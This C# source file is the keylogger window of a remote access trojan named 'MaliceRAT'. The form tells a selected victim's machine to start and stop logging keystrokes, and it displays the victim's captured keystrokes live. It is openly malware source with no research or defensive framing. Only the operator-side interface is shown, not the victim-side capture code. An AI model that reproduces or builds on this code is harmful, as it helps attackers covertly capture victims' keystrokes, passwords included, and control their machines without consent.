using System;
using System.Windows.Forms;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public partial class KeyLoggerForm : Form
    {
        private int victimId;
        private Server server;
        public KeyLoggerForm(int victimId, Server server)
        {
            InitializeComponent();
            this.victimId = victimId;
            this.server = server;

            server.keyLogger.OnKeystrokeReceived += OnKeystrokeReceived;

            titleLabel.Text = $"Key Logger [{server.GetVictimById(victimId).User}]";
        }

        private void OnKeystrokeReceived(Victim victim, string keystroke)
        {
            if (victim.Id == victimId)
            {
                textBox1.Text += keystroke + "\n";
            }
        }

        private void KeyLoggerForm_Load(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "start_keylogger" });
        }

        private void KeyLoggerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "stop_keylogger" });
        }
    }
}